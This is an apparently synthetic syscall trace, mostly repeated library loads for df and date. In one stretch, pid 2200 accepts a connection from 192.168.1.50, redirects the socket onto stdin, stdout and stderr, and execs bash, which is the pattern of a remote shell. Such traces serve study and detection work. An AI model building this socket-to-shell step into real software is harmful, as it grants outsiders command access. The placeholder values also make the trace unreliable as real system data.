[pid 3048] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3048] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3048] close(3) = 0
[pid 3048] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3048] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3048] close(3) = 0
[pid 3048] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3048] read(3, "mount_line", 1024) = 100
[pid 3048] close(3) = 0
[pid 3049] execve("/bin/df", ["df"], 0x7fffc2c935f0) = 0
[pid 3049] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 3049] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3049] close(3) = 0
[pid 3049] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 3049] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 3049] close(3) = 0
[pid 3049] openat(AT_FDCWD, "/proc/mounts", O_RDONLY) = 3
[pid 3049] read(3, "mount_line", 1024) = 100
[pid 3049] close(3) = 0
[pid 2200] accept(3, {sa_family=AF_INET, sin_port=htons(55123), sin_addr=inet_addr("192.168.1.50")}, 16) = 4
[pid 2200] dup2(4, 0) = 0
[pid 2200] dup2(4, 1) = 1
[pid 2200] dup2(4, 2) = 2
[pid 2200] close(4) = 0
[pid 2200] execve("/bin/bash", ["bash"], 0x7fffc2c935f0) = 0
[pid 2200] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 2200] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 2200] close(3) = 0
[pid 2200] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 2200] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 2200] close(3) = 0
[pid 4000] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4000] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4000] close(3) = 0
[pid 4000] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4000] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4000] close(3) = 0
[pid 4000] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4000] read(3, "TZDATA", 64) = 64
[pid 4000] close(3) = 0
[pid 4001] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4001] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4001] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4001] close(3) = 0
[pid 4001] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4001] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4001] close(3) = 0
[pid 4001] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4001] read(3, "TZDATA", 64) = 64
[pid 4001] close(3) = 0
[pid 4002] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4002] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4002] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4002] close(3) = 0
[pid 4002] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4002] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4002] close(3) = 0
[pid 4002] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4002] read(3, "TZDATA", 64) = 64
[pid 4002] close(3) = 0
[pid 4003] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4003] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4003] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4003] close(3) = 0
[pid 4003] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4003] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4003] close(3) = 0
[pid 4003] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4003] read(3, "TZDATA", 64) = 64
[pid 4003] close(3) = 0
[pid 4004] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4004] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4004] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4004] close(3) = 0
[pid 4004] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4004] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4004] close(3) = 0
[pid 4004] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4004] read(3, "TZDATA", 64) = 64
[pid 4004] close(3) = 0
[pid 4005] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4005] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4005] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4005] close(3) = 0
[pid 4005] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4005] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4005] close(3) = 0
[pid 4005] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4005] read(3, "TZDATA", 64) = 64
[pid 4005] close(3) = 0
[pid 4006] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4006] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4006] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4006] close(3) = 0
[pid 4006] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4006] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4006] close(3) = 0
[pid 4006] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4006] read(3, "TZDATA", 64) = 64
[pid 4006] close(3) = 0
[pid 4007] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4007] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4007] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4007] close(3) = 0
[pid 4007] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4007] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4007] close(3) = 0
[pid 4007] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4007] read(3, "TZDATA", 64) = 64
[pid 4007] close(3) = 0
[pid 4008] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4008] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4008] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4008] close(3) = 0
[pid 4008] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4008] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4008] close(3) = 0
[pid 4008] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4008] read(3, "TZDATA", 64) = 64
[pid 4008] close(3) = 0
[pid 4009] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4009] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4009] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4009] close(3) = 0
[pid 4009] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4009] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4009] close(3) = 0
[pid 4009] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4009] read(3, "TZDATA", 64) = 64
[pid 4009] close(3) = 0
[pid 4010] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4010] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4010] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4010] close(3) = 0
[pid 4010] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4010] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4010] close(3) = 0
[pid 4010] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4010] read(3, "TZDATA", 64) = 64
[pid 4010] close(3) = 0
[pid 4011] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4011] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4011] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4011] close(3) = 0
[pid 4011] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4011] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4011] close(3) = 0
[pid 4011] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4011] read(3, "TZDATA", 64) = 64
[pid 4011] close(3) = 0
[pid 4012] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4012] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4012] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4012] close(3) = 0
[pid 4012] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4012] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4012] close(3) = 0
[pid 4012] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4012] read(3, "TZDATA", 64) = 64
[pid 4012] close(3) = 0
[pid 4013] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4013] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4013] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4013] close(3) = 0
[pid 4013] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4013] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4013] close(3) = 0
[pid 4013] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4013] read(3, "TZDATA", 64) = 64
[pid 4013] close(3) = 0
[pid 4014] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4014] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4014] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4014] close(3) = 0
[pid 4014] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4014] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4014] close(3) = 0
[pid 4014] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4014] read(3, "TZDATA", 64) = 64
[pid 4014] close(3) = 0
[pid 4015] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4015] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4015] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4015] close(3) = 0
[pid 4015] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4015] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4015] close(3) = 0
[pid 4015] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4015] read(3, "TZDATA", 64) = 64
[pid 4015] close(3) = 0
[pid 4016] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4016] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4016] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4016] close(3) = 0
[pid 4016] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4016] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4016] close(3) = 0
[pid 4016] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4016] read(3, "TZDATA", 64) = 64
[pid 4016] close(3) = 0
[pid 4017] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4017] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4017] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4017] close(3) = 0
[pid 4017] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4017] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4017] close(3) = 0
[pid 4017] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4017] read(3, "TZDATA", 64) = 64
[pid 4017] close(3) = 0
[pid 4018] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4018] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4018] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4018] close(3) = 0
[pid 4018] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4018] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4018] close(3) = 0
[pid 4018] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4018] read(3, "TZDATA", 64) = 64
[pid 4018] close(3) = 0
[pid 4019] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4019] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4019] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4019] close(3) = 0
[pid 4019] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4019] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4019] close(3) = 0
[pid 4019] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4019] read(3, "TZDATA", 64) = 64
[pid 4019] close(3) = 0
[pid 4020] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4020] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4020] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4020] close(3) = 0
[pid 4020] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4020] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4020] close(3) = 0
[pid 4020] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4020] read(3, "TZDATA", 64) = 64
[pid 4020] close(3) = 0
[pid 4021] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4021] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4021] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4021] close(3) = 0
[pid 4021] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4021] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4021] close(3) = 0
[pid 4021] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4021] read(3, "TZDATA", 64) = 64
[pid 4021] close(3) = 0
[pid 4022] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4022] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4022] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4022] close(3) = 0
[pid 4022] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4022] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4022] close(3) = 0
[pid 4022] openat(AT_FDCWD, "/etc/localtime", O_RDONLY) = 3
[pid 4022] read(3, "TZDATA", 64) = 64
[pid 4022] close(3) = 0
[pid 4023] execve("/bin/date", ["date"], 0x7fffc2c935f0) = 0
[pid 4023] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY) = 3
[pid 4023] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4023] close(3) = 0
[pid 4023] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY) = 3
[pid 4023] read(3, "ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0", 832) = 832
[pid 4023] close(3) = 0
